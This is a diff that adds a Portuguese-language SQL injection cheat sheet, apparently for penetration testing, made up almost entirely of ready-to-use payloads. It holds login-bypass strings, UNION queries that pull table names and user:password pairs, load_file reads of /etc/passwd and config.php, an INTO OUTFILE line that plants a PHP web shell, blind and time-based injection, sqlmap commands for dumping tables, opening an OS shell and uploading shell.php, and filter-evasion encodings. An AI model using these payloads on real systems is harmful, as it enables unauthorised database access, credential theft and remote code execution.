@@ -1,0 +1,199 @@
+╔══════════════════════════════════════════════════════════════╗
+║                    SQL INJECTION CHEAT SHEET                 ║
+║                    Para Testes de Penetração                 ║
+╚══════════════════════════════════════════════════════════════╝
+
+┌──────────────────────────────────────────────────────────────┐
+│  🔍 DETECÇÃO DE SQLi                                         │
+├──────────────────────────────────────────────────────────────┤
+│  Payload                      Resposta esperada              │
+├──────────────────────────────────────────────────────────────┤
+│  '                            Erro de SQL (aspas simples)    │
+│  "                            Erro de SQL (aspas duplas)     │
+│  `                            Erro de SQL (crase)            │
+│  ;                            Erro de SQL (ponto e vírgula)  │
+│  \                            Erro de SQL (barra invertida)  │
+│  --                           Comentário (MySQL)             │
+│  #                            Comentário (MySQL)             │
+│  /* */                        Comentário (todos)             │
+│  ' OR '1'='1                  Bypass de login                │
+│  ' OR 1=1 --                  Bypass de login (MySQL)        │
+│  ' OR '1'='1' --              Bypass de login (padrão)       │
+│  ' OR 1=1#                     Bypass de login (MySQL)       │
+│  " OR "1"="1                   Bypass de login (ASP)         │
+│  admin' --                     Login como admin              │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  🚀 UNION-BASED SQLi                                         │
+├──────────────────────────────────────────────────────────────┤
+│  Passo 1: Descobrir número de colunas                        │
+├──────────────────────────────────────────────────────────────┤
+│  ' ORDER BY 1 --              Testa coluna 1                 │
+│  ' ORDER BY 2 --              Testa coluna 2                 │
+│  ' ORDER BY 3 --              Testa coluna 3                 │
+│  ' ORDER BY 4 --              Testa coluna 4 (até erro)      │
+│                                                              │
+│  Alternativa:                                                │
+│  ' UNION SELECT NULL --       Testa 1 coluna                 │
+│  ' UNION SELECT NULL,NULL --  Testa 2 colunas                │
+│  ' UNION SELECT NULL,NULL,NULL -- Testa 3 colunas            │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  💾 EXTRAÇÃO DE DADOS                                        │
+├──────────────────────────────────────────────────────────────┤
+│  Payload                      Descrição                      │
+├──────────────────────────────────────────────────────────────┤
+│  ' UNION SELECT database(),2,3 -- Nome do banco              │
+│  ' UNION SELECT user(),2,3 --  Usuário atual                 │
+│  ' UNION SELECT version(),2,3 -- Versão do banco             │
+│                                                              │
+│  MySQL:                                                      │
+│  ' UNION SELECT table_name,2,3 FROM information_schema.tables │
+│  ' UNION SELECT column_name,2,3 FROM information_schema.columns │
+│  ' UNION SELECT concat(user,':',password),2,3 FROM users --  │
+│                                                              │
+│  Oracle:                                                     │
+│  ' UNION SELECT table_name,2,3 FROM all_tables --            │
+│  ' UNION SELECT column_name,2,3 FROM all_tab_columns --      │
+│                                                              │
+│  SQL Server:                                                 │
+│  ' UNION SELECT name,2,3 FROM sysobjects --                  │
+│  ' UNION SELECT name,2,3 FROM syscolumns --                  │
+│                                                              │
+│  PostgreSQL:                                                 │
+│  ' UNION SELECT table_name,2,3 FROM information_schema.tables│
+│  ' UNION SELECT column_name,2,3 FROM information_schema.columns │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  📝 TIPOS DE BANCO DE DADOS                                  │
+├──────────────────────────────────────────────────────────────┤
+│  Tipo            | Strings de detecção                       │
+├──────────────────────────────────────────────────────────────┤
+│  MySQL           | version(), database(), user()             │
+│  Oracle          | SELECT * FROM v$version                   │
+│  SQL Server      | @@version, db_name()                      │
+│  PostgreSQL      | version(), current_database()             │
+│  SQLite          | sqlite_version()                          │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  📂 LEITURA DE ARQUIVOS (MySQL)                              │
+├──────────────────────────────────────────────────────────────┤
+│  ' UNION SELECT load_file('/etc/passwd'),2,3 --              │
+│  ' UNION SELECT load_file('C:\\Windows\\win.ini'),2,3 --     │
+│  ' UNION SELECT load_file('/var/www/html/config.php'),2,3 -- │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  📝 ESCRITA DE ARQUIVOS (MySQL)                              │
+├──────────────────────────────────────────────────────────────┤
+│  ' UNION SELECT "<?php system($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/shell.php' -- │
+│  ' UNION SELECT "hacked",2,3 INTO DUMPFILE '/tmp/hack.txt' -- │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  ⚡ BLIND SQLi - Boolean Based                               │
+├──────────────────────────────────────────────────────────────┤
+│  Payload                      Descrição                      │
+├──────────────────────────────────────────────────────────────┤
+│  ' AND 1=1 --                  Verdadeiro (página normal)    │
+│  ' AND 1=2 --                  Falso (página diferente)      │
+│                                                              │
+│  ' AND ASCII(SUBSTRING(database(),1,1)) > 100 --             │
+│  ' AND ASCII(SUBSTRING(database(),1,1)) = 100 --             │
+│  ' AND ASCII(SUBSTRING(database(),1,1)) < 100 --             │
+│                                                              │
+│  ' AND (SELECT COUNT(*) FROM users) > 0 --                   │
+│  ' AND (SELECT LENGTH(password) FROM users LIMIT 1) = 8 --   │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  ⏱️ BLIND SQLi - Time Based                                  │
+├──────────────────────────────────────────────────────────────┤
+│  MySQL:                                                      │
+│  ' AND SLEEP(5) --            Delay 5 segundos               │
+│  ' AND IF(1=1, SLEEP(5), 0) -- Condicional                   │
+│  ' AND IF(ASCII(SUBSTRING(database(),1,1)) > 100, SLEEP(5), 0) -- │
+│                                                              │
+│  PostgreSQL:                                                 │
+│  ' AND pg_sleep(5) --         Delay 5 segundos               │
+│                                                              │
+│  SQL Server:                                                 │
+│  ' WAITFOR DELAY '00:00:05' -- Delay 5 segundos              │
+│                                                              │
+│  Oracle:                                                     │
+│  ' AND DBMS_LOCK.SLEEP(5) --  Delay 5 segundos               │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  🔧 FERRAMENTA: SQLMap                                       │
+├──────────────────────────────────────────────────────────────┤
+│  Comando                      Descrição                      │
+├──────────────────────────────────────────────────────────────┤
+│  sqlmap -u "http://site.com/page?id=1" --dbs                 │
+│                             Lista bancos de dados            │
+│                                                              │
+│  sqlmap -u "http://site.com/page?id=1" -D database --tables  │
+│                             Lista tabelas do banco           │
+│                                                              │
+│  sqlmap -u "http://site.com/page?id=1" -D database -T users --columns │
+│                             Lista colunas da tabela          │
+│                                                              │
+│  sqlmap -u "http://site.com/page?id=1" -D database -T users --dump │
+│                             Extrai dados da tabela           │
+│                                                              │
+│  sqlmap -u "http://site.com/page?id=1" --os-shell            │
+│                             Tenta shell no servidor          │
+│                                                              │
+│  sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd" │
+│                             Lê arquivo do servidor           │
+│                                                              │
+│  sqlmap -u "http://site.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" │
+│                             Envia arquivo para servidor      │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  🎯 BYPASS DE FILTROS                                        │
+├──────────────────────────────────────────────────────────────┤
+│  Técnica                      Exemplo                        │
+├──────────────────────────────────────────────────────────────┤
+│  Case Variation               ' Or 1=1 --                    │
+│  Comments                     '/**/OR/**/1=1/**/--           │
+│  URL Encoding                 %27%20OR%201%3D1%20--          │
+│  Double Encoding              %2527%2520OR%25201%253D1%2520--│
+│  Hex Encoding                 ' OR 1=1 -- em hex: 0x27204f5220313d31202d2d │
+│  Char Encoding                CHAR(39) OR CHAR(49) ...      │
+│  Whitespace                   'OR'1'='1'--                   │
+│  No spaces                    'OR/**/1=1--                   │
+│  No quotes                    0x61646d696e (admin em hex)    │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  ⚠️ PAYLOADS PARA DIFERENTES CONTEXTOS                      │
+├──────────────────────────────────────────────────────────────┤
+│  Contexto                     Payload                        │
+├──────────────────────────────────────────────────────────────┤
+│  Login (usuário)              admin' --                      │
+│  Login (senha)                 ' OR '1'='1                   │
+│  URL param                     page=1' UNION SELECT 1,2,3 -- │
+│  JSON                          {"user": "admin' --"}         │
+│  XML                           <user>admin' --</user>        │
+│  Cookie                        Cookie: user=admin' --        │
+│  Header                        User-Agent: ' OR 1=1 --       │
+└──────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────┐
+│  📚 WORDLISTS ÚTEIS                                          │
+├──────────────────────────────────────────────────────────────┤
+│  Localização                   Descrição                     │
+├──────────────────────────────────────────────────────────────┤
+│  /usr/share/wordlists/rockyou.txt Senhas comuns              │
+│  /usr/share/wordlists/dirb/common.txt Diretórios comuns      │
+│  /usr/share/seclists/         Coleção completa               │
+│  /usr/share/sqlmap/txt/       Wordlists do SQLMap            │
+└──────────────────────────────────────────────────────────────┘
